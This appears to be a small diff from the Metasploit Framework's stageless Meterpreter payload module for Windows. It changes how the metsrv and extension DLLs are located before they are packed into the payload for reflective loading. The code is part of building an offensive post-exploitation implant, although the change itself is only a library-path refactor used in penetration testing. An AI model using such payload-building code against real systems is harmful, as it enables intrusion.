@@ -52,7 +52,7 @@ module Payload::Windows::StagelessMeterpreter
   end
 
   def generate_stageless_x86(url = nil)
-    dll, offset = load_rdi_dll(MeterpreterBinaries.path('metsrv', 'x86.dll'))
+    dll, offset = load_rdi_dll(MetasploitPayloads.meterpreter_path('metsrv', 'x86.dll'))
 
     conf = {
       :rdi_offset => offset,
@@ -104,7 +104,7 @@ module Payload::Windows::StagelessMeterpreter
     unless datastore['EXTENSIONS'].nil?
       datastore['EXTENSIONS'].split(',').each do |e|
         e = e.strip.downcase
-        ext, o = load_rdi_dll(MeterpreterBinaries.path("ext_server_#{e}", 'x86.dll'))
+        ext, o = load_rdi_dll(MetasploitPayloads.meterpreter_path("ext_server_#{e}", 'x86.dll'))
 
         # append the size, offset to RDI and the payload itself
         dll << [ext.length].pack('V') + ext
